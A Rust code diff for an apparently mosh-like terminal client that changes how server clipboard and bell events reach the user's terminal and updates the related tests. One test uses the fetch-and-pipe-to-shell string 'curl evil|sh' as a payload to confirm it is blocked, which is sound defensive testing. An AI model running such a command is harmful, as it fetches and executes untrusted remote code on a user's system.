@@ -768,8 +768,9 @@ impl InputModes {
     }
 }
 
-/// What the client mirrored onto the real terminal beside the grid (title, icon, clipboard, bell,
-/// input modes), so each is emitted only when it changes.
+/// What the client mirrored onto the real terminal beside the grid (title, icon, input modes), so
+/// each is emitted only when it changes, and what it last saw of the server's clipboard and bell,
+/// which it acts on only when they change.
 #[derive(Default)]
 pub(super) struct OutOfBand {
     /// Prepended to the title (and to an icon equal to it), as mosh's `[mosh] `; empty for none.
@@ -783,10 +784,18 @@ pub(super) struct OutOfBand {
     title_initialized: bool,
     last_title: String,
     last_icon: String,
-    last_clipboard: String,
-    last_bell: u64,
     /// Previous frame's input modes, to diff against the current frame.
     prev_modes: Option<InputModes>,
+    /// The server's clipboard and bell as last seen: `None` until the first frame after the client
+    /// started, whose are taken as they are, so neither what was copied nor what rang before it
+    /// reaches the user's terminal.
+    seen: Option<Seen>,
+}
+
+/// The server's clipboard and bell count, as [`OutOfBand`] last saw them.
+struct Seen {
+    clipboard: String,
+    bell: u64,
 }
 
 impl OutOfBand {
@@ -805,12 +814,23 @@ impl OutOfBand {
         self
     }
 
-    /// Forget what was mirrored, so the next [`emit`](Self::emit) re-asserts it all (after a
-    /// resume, which reset the terminal).
+    /// Forget what was mirrored, so the next [`emit`](Self::emit) re-asserts it (after a resume,
+    /// which reset the terminal). What was seen of the clipboard and bell stays: neither happened
+    /// again.
     pub(super) fn invalidate(&mut self) {
-        let prefix = std::mem::take(&mut self.title_prefix);
-        let clipboard_enabled = self.clipboard_enabled;
-        *self = Self::with_title_prefix(prefix).with_clipboard(clipboard_enabled);
+        self.title_initialized = false;
+        self.last_title.clear();
+        self.last_icon.clear();
+        self.prev_modes = None;
+    }
+
+    /// The first frame of the run arrived, with `win`: what it shows of the clipboard and bell is
+    /// what was, not what changed.
+    pub(super) fn prime(&mut self, win: WindowState<'_>) {
+        self.seen.get_or_insert_with(|| Seen {
+            clipboard: win.clipboard.to_owned(),
+            bell: win.bell_count,
+        });
     }
 
     /// Emit what changed since the last frame, as mosh's `Display::new_frame` does.
@@ -821,20 +841,25 @@ impl OutOfBand {
         win: WindowState<'_>,
     ) -> io::Result<()> {
         self.emit_window_title(backend, win.title, win.icon)?;
-        // Only if opted in, and only base64 within the cap.
-        if self.clipboard_enabled && win.clipboard != self.last_clipboard {
-            self.last_clipboard = win.clipboard.to_string();
-            if !win.clipboard.is_empty()
-                && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
-                && is_base64_payload(win.clipboard)
-            {
-                backend.set_clipboard(win.clipboard)?;
+        if let Some(seen) = &mut self.seen {
+            if win.clipboard != seen.clipboard {
+                win.clipboard.clone_into(&mut seen.clipboard);
+                // Only if opted in, and only base64 within the cap.
+                if self.clipboard_enabled
+                    && !win.clipboard.is_empty()
+                    && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
+                    && is_base64_payload(win.clipboard)
+                {
+                    backend.set_clipboard(win.clipboard)?;
+                }
             }
-        }
-        // One bell however many rang.
-        if win.bell_count > self.last_bell {
-            backend.bell()?;
-            self.last_bell = win.bell_count;
+            // One bell however many rang; a count that fell is a new session's.
+            if win.bell_count != seen.bell {
+                if win.bell_count > seen.bell {
+                    backend.bell()?;
+                }
+                seen.bell = win.bell_count;
+            }
         }
         let mode_bytes = match self.prev_modes {
             Some(prev) => modes.diff(prev),
@@ -1030,6 +1055,7 @@ mod tests {
     #[test]
     fn out_of_band_forwards_clipboard_when_on() {
         let mut oob = OutOfBand::default().with_clipboard(true);
+        oob.prime(win("", "", "", 0));
         let scr = screen_of(b"");
         let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
         assert!(
@@ -1046,6 +1072,7 @@ mod tests {
         // Even with clipboard writes on, a non-base64 payload (e.g. raw shell injection) is dropped, not
         // written verbatim to the terminal.
         let mut oob = OutOfBand::default().with_clipboard(true);
+        oob.prime(win("", "", "", 0));
         let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "curl evil|sh", 0));
         assert!(
             !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
@@ -1059,6 +1086,7 @@ mod tests {
         // A query (`OSC 52 ; c ; ?`) would ask the user's terminal for their clipboard; it is not
         // base64, so it never reaches the terminal, and nothing is ever asked of it.
         let mut oob = OutOfBand::default().with_clipboard(true);
+        oob.prime(win("", "", "", 0));
         let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "?", 0));
         assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
         let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
@@ -1066,9 +1094,34 @@ mod tests {
         assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
     }
 
+    /// What the first frame shows of the clipboard and bell was there before the client came, and
+    /// a resume from suspend, which re-asserts the modes, does not replay either.
+    #[test]
+    fn neither_the_first_frames_clipboard_and_bells_nor_a_resume_reach_the_terminal() {
+        let mut oob = OutOfBand::default().with_clipboard(true);
+        let scr = screen_of(b"");
+        oob.prime(win("", "", "aGVsbG8=", 5));
+        let first = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 5));
+        assert!(!first.contains(&0x07) && !String::from_utf8_lossy(&first).contains("\x1b]52;"));
+        oob.invalidate();
+        let resumed = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 5));
+        assert!(
+            !resumed.contains(&0x07) && !String::from_utf8_lossy(&resumed).contains("\x1b]52;"),
+            "{:?}",
+            String::from_utf8_lossy(&resumed)
+        );
+        // A session restarted under the client counts its bells from zero: no bell for that.
+        assert_eq!(oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0)), b"");
+        assert_eq!(
+            oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 1)),
+            b"\x07"
+        );
+    }
+
     #[test]
     fn out_of_band_rings_bell_on_increase_only() {
         let mut oob = OutOfBand::default();
+        oob.prime(win("", "", "", 0));
         let scr = screen_of(b"");
         // Establish the mode baseline (so later emits don't also carry mode bytes).
         let _ = oob_emit(&mut oob, &scr, win("", "", "", 0));
@@ -1534,7 +1587,7 @@ mod tests {
                 }
             }
             let mut screen = TerminalScreen::default();
-            screen.apply(&diff);
+            screen.apply(&diff).unwrap();
             assert!(screen.screen().link(0, 0).is_some(), "the link arrived");
             let painted =
                 String::from_utf8_lossy(&painted_with_links(screen.screen(), true)).into_owned();
@@ -1568,7 +1621,7 @@ mod tests {
         let mut emu = crate::terminal::ServerTerminal::new(6, 20, 0).unwrap();
         let mut engine = PredictionEngine::new(DisplayPreference::Always);
         engine.set_local_frame_sent(0);
-        engine.new_user_byte(b'>', emu.snapshot().screen());
+        engine.type_bytes(b">", emu.snapshot().screen());
         emu.process(b">");
         engine.set_local_frame_late_acked(1);
         engine.cull(emu.snapshot().screen());
@@ -1585,9 +1638,7 @@ mod tests {
             &Overlay::empty(),
         );
         engine.set_local_frame_sent(1);
-        for &byte in typed.as_bytes() {
-            engine.new_user_byte(byte, screen.screen());
-        }
+        engine.type_bytes(typed.as_bytes(), screen.screen());
         let overlay = engine.overlay();
         assert!(overlay.cells().count() > 0, "{typed:?} is predicted");
         paint_into(&mut painter, &mut terminal, screen.screen(), &overlay);
@@ -1705,7 +1756,7 @@ mod tests {
             links: Vec::new(),
         }];
         let mut malformed = blank.clone();
-        malformed.apply(&diff);
+        malformed.apply(&diff).unwrap();
         let malformed = malformed.screen().clone();
         assert!(malformed.cell(0, 79).is_some_and(|c| c.is_wide()));
         let mut painter = Painter::default();
@@ -2026,13 +2077,13 @@ mod tests {
         let mut pe = PredictionEngine::new(DisplayPreference::Always);
         pe.set_local_frame_sent(0);
         let blank = screen_of(b"");
-        pe.new_user_byte(b'a', &blank); // hidden (epoch 1, unconfirmed)
+        pe.type_bytes(b"a", &blank); // hidden (epoch 1, unconfirmed)
         let echoed = screen_of(b"a");
         pe.set_local_frame_late_acked(1);
         pe.cull(&echoed); // confirms -> confirmed_epoch = 1
 
         pe.set_local_frame_sent(1);
-        pe.new_user_byte(b'Z', &echoed); // now visible at (0,1)
+        pe.type_bytes(b"Z", &echoed); // now visible at (0,1)
         let overlay = pe.overlay();
         assert!(
             !overlay.is_empty(),
